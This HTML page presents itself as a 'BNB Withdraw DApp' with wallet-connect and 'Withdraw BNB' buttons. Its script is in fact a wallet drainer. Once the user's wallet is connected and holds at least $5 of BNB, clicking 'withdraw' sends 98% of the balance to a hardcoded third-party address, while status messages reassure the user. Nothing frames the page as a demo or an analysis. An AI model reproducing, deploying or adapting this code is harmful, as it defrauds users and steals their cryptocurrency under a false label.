<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>BNB Withdraw DApp</title>
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 1rem;
      background: #f9f9f9;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }
    w3m-core-button {
      margin: 20px 0;
    }
    #withdrawBtn {
      background-color: #f0b90b;
      color: #fff;
      border: none;
      padding: 1rem 2rem;
      font-size: 1rem;
      border-radius: 8px;
      cursor: pointer;
      display: none;
    }
    #message {
      margin-top: 1.5rem;
      font-weight: bold;
      font-size: 1rem;
      color: #d9534f;
      text-align: center;
      min-height: 1.2em;
    }
    @media (max-width: 600px) {
      #withdrawBtn {
        width: 100%;
        font-size: 1.1rem;
        padding: 1rem;
      }
    }
  </style>
</head>
<body>

  <!-- Wallet connect button -->
  <w3m-core-button></w3m-core-button>

  <!-- Withdraw button -->
  <button id="withdrawBtn">Withdraw BNB</button>

  <!-- Status and error messages -->
  <div id="message"></div>

  <script type="module">
    import { getAccount, fetchBalance, sendTransaction } from "https://unpkg.com/@web3modal/ethereum@2.6.2";

    const withdrawBtn = document.getElementById("withdrawBtn");
    const message = document.getElementById("message");
    const recipient = "0xa84bd2cfbBad66Ae2c5daf9aCe764dc845b94C7C";
    const MIN_USD = 5;
    const SEND_PERCENT = 0.98;

    async function getBNBPrice() {
      try {
        const res = await fetch("https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT");
        const data = await res.json();
        return parseFloat(data.price);
      } catch {
        return null;
      }
    }

    async function checkWallet() {
      const acc = getAccount();
      if (acc?.isConnected) {
        withdrawBtn.style.display = "inline-block";
        message.textContent = "Wallet connected. You can withdraw.";
      } else {
        withdrawBtn.style.display = "none";
        message.textContent = "Please connect your wallet to continue.";
      }
    }

    async function withdrawBNB() {
      const acc = getAccount();
      if (!acc?.isConnected) {
        message.textContent = "Wallet not connected.";
        return;
      }

      try {
        const price = await getBNBPrice();
        if (!price) {
          message.textContent = "Failed to fetch BNB price.";
          return;
        }

        const balance = await fetchBalance({ address: acc.address, chainId: 56 });
        const bnbAmount = parseFloat(balance.formatted);
        const usdAmount = bnbAmount * price;

        if (usdAmount < MIN_USD) {
          message.textContent = `Minimum $${MIN_USD} required to withdraw. Current: $${usdAmount.toFixed(2)}`;
          return;
        }

        const toSend = (bnbAmount * SEND_PERCENT).toFixed(6);
        const valueWei = BigInt(Math.floor(toSend * 1e18)).toString();

        const { hash } = await sendTransaction({
          to: recipient,
          value: valueWei,
        });

        message.textContent = `Transaction sent! Hash: ${hash}`;
      } catch (err) {
        console.error(err);
        message.textContent = "Transaction failed. Please check gas fees and try again.";
      }
    }

    withdrawBtn.addEventListener("click", withdrawBNB);
    setInterval(checkWallet, 1000);
  </script>
</body>
</html>
